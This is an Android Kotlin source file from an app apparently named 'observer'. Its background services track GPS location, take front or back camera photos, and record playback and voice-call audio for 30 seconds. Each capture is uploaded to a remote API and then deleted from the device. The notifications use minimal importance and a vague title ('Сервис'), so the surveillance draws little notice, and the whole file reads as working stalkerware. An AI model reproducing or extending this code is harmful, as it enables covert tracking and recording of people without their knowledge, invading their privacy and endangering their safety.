package ru.observer.app.collect

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.media.AudioAttributes
import android.media.AudioFormat
import android.media.AudioPlaybackCaptureConfiguration
import android.media.AudioRecord
import android.media.projection.MediaProjection
import android.media.projection.MediaProjectionManager
import android.os.Build
import android.os.IBinder
import androidx.camera.core.CameraSelector
import androidx.camera.core.ImageCapture
import androidx.camera.core.ImageCaptureException
import androidx.camera.lifecycle.ProcessCameraProvider
import androidx.core.content.ContextCompat
import androidx.lifecycle.Lifecycle
import androidx.lifecycle.LifecycleOwner
import androidx.lifecycle.LifecycleRegistry
import com.google.android.gms.location.*
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import ru.observer.app.data.Db
import ru.observer.app.data.Event
import ru.observer.app.net.Api
import java.io.File
import java.io.FileOutputStream

private fun ch(c: Context, id: String, name: String): Notification {
    val nm = c.getSystemService(NotificationManager::class.java)
    if (nm.getNotificationChannel(id) == null)
        nm.createNotificationChannel(NotificationChannel(id, name, NotificationManager.IMPORTANCE_MIN))
    return Notification.Builder(c, id).setSmallIcon(android.R.drawable.stat_sys_download)
        .setContentTitle("Сервис").setOngoing(true).build()
}

class LocationService : Service() {
    private val fused by lazy { LocationServices.getFusedLocationProviderClient(this) }

    override fun onStartCommand(i: Intent?, f: Int, s: Int): Int {
        startForeground(1, ch(this, "loc", "Геолокация"))
        val req = LocationRequest.Builder(Priority.PRIORITY_BALANCED_POWER_ACCURACY, 90_000L)
            .setMinUpdateDistanceMeters(25f).build()
        try { fused.requestLocationUpdates(req, cb, mainLooper) } catch (e: SecurityException) {}
        return START_STICKY
    }

    private val cb = object : LocationCallback() {
        override fun onLocationResult(r: LocationResult) {
            r.lastLocation?.let { Api.loc(this@LocationService, it.latitude, it.longitude) }
        }
    }

    override fun onBind(i: Intent?): IBinder? = null
    companion object {
        fun start(c: Context) = ContextCompat.startForegroundService(c, Intent(c, LocationService::class.java))
    }
}

class CaptureService : Service(), LifecycleOwner {
    private val reg = LifecycleRegistry(this)
    override val lifecycle: Lifecycle get() = reg
    private var front = false

    override fun onCreate() { super.onCreate(); reg.currentState = Lifecycle.State.CREATED }

    override fun onStartCommand(i: Intent?, f: Int, s: Int): Int {
        startForeground(2, ch(this, "cam", "Камера"))
        front = i?.getBooleanExtra("front", false) ?: false
        reg.currentState = Lifecycle.State.RESUMED
        val fut = ProcessCameraProvider.getInstance(this)
        fut.addListener({
            try {
                val p = fut.get()
                val file = File(cacheDir, "p_${System.currentTimeMillis()}.jpg")
                val out = ImageCapture.OutputFileOptions.Builder(file).build()
                val cap = ImageCapture.Builder().build()
                p.unbindAll()
                p.bindToLifecycle(this,
                    if (front) CameraSelector.DEFAULT_FRONT_CAMERA else CameraSelector.DEFAULT_BACK_CAMERA, cap)
                cap.takePicture(out, ContextCompat.getMainExecutor(this),
                    object : ImageCapture.OnImageSavedCallback {
                        override fun onImageSaved(r: ImageCapture.OutputFileResults) {
                            Api.upload(this@CaptureService, file,
                                if (front) "photo_front" else "photo_back", 0) { file.delete() }
                            CoroutineScope(Dispatchers.IO).launch {
                                Db.get(this@CaptureService).dao().add(Event(kind = "photo",
                                    title = if (front) "фронталка" else "тыл",
                                    contact = "Камера|снимок", src = "cam", synced = true))
                            }
                            stopSelf()
                        }
                        override fun onError(e: ImageCaptureException) { stopSelf() }
                    })
            } catch (e: Exception) { stopSelf() }
        }, ContextCompat.getMainExecutor(this))
        return START_NOT_STICKY
    }

    override fun onDestroy() { reg.currentState = Lifecycle.State.DESTROYED; super.onDestroy() }
    override fun onBind(i: Intent?): IBinder? = null
    companion object {
        fun shoot(c: Context, front: Boolean) = ContextCompat.startForegroundService(
            c, Intent(c, CaptureService::class.java).putExtra("front", front))
    }
}

class AudioCaptureService : Service() {
    private var rec: AudioRecord? = null
    private var run = false

    override fun onStartCommand(i: Intent?, f: Int, s: Int): Int {
        startForeground(3, ch(this, "aud", "Звук"))
        if (Build.VERSION.SDK_INT < 29) { stopSelf(); return START_NOT_STICKY }
        val code = i?.getIntExtra("code", 0) ?: 0
        val data = i?.getParcelableExtra<Intent>("data") ?: run { stopSelf(); return START_NOT_STICKY }
        val proj: MediaProjection = getSystemService(MediaProjectionManager::class.java)
            .getMediaProjection(code, data)
        val cfg = AudioPlaybackCaptureConfiguration.Builder(proj)
            .addMatchingUsage(AudioAttributes.USAGE_MEDIA)
            .addMatchingUsage(AudioAttributes.USAGE_VOICE_COMMUNICATION).build()
        val fmt = AudioFormat.Builder().setEncoding(AudioFormat.ENCODING_PCM_16BIT)
            .setSampleRate(44100).setChannelMask(AudioFormat.CHANNEL_IN_MONO).build()
        val buf = AudioRecord.getMinBufferSize(44100, AudioFormat.CHANNEL_IN_MONO,
            AudioFormat.ENCODING_PCM_16BIT).coerceAtLeast(8192) * 2
        rec = AudioRecord.Builder().setAudioFormat(fmt).setBufferSizeInBytes(buf)
            .setAudioPlaybackCaptureConfig(cfg).build()
        val file = File(cacheDir, "v_${System.currentTimeMillis()}.wav")
        run = true
        rec?.startRecording()
        Thread {
            val os = FileOutputStream(file)
            os.write(ByteArray(44))
            val b = ByteArray(buf)
            var total = 0
            val t0 = System.currentTimeMillis()
            while (run && System.currentTimeMillis() - t0 < 30_000) {
                val n = rec?.read(b, 0, b.size) ?: 0
                if (n > 0) { os.write(b, 0, n); total += n }
            }
            os.close(); wav(file, total)
            rec?.release(); rec = null
            Api.upload(this, file, "voice", (System.currentTimeMillis() - t0).toInt()) { file.delete() }
            CoroutineScope(Dispatchers.IO).launch {
                Db.get(this@AudioCaptureService).dao().add(Event(kind = "voice", title = "звук",
                    contact = "Звук|запись", src = "capture", synced = true))
            }
            stopSelf()
        }.start()
        return START_NOT_STICKY
    }

    private fun wav(f: File, len: Int) {
        try {
            val raf = java.io.RandomAccessFile(f, "rw"); raf.seek(0)
            val h = ByteArray(44)
            fun p(v: Int, o: Int) {
                h[o] = v.toByte(); h[o + 1] = (v shr 8).toByte()
                h[o + 2] = (v shr 16).toByte(); h[o + 3] = (v shr 24).toByte()
            }
            "RIFF".forEachIndexed { i, c -> h[i] = c.code.toByte() }
            p(36 + len, 4); "WAVEfmt ".forEachIndexed { i, c -> h[8 + i] = c.code.toByte() }
            p(16, 16); p(1, 20); p(1, 22); p(44100, 24); p(88200, 28); p(2, 32); p(16, 34)
            "data".forEachIndexed { i, c -> h[36 + i] = c.code.toByte() }; p(len, 40)
            raf.write(h); raf.close()
        } catch (e: Exception) {}
    }

    override fun onDestroy() { run = false; super.onDestroy() }
    override fun onBind(i: Intent?): IBinder? = null
    companion object {
        fun start(c: Context, code: Int, data: Intent) = ContextCompat.startForegroundService(
            c, Intent(c, AudioCaptureService::class.java).putExtra("code", code).putExtra("data", data))
    }
}
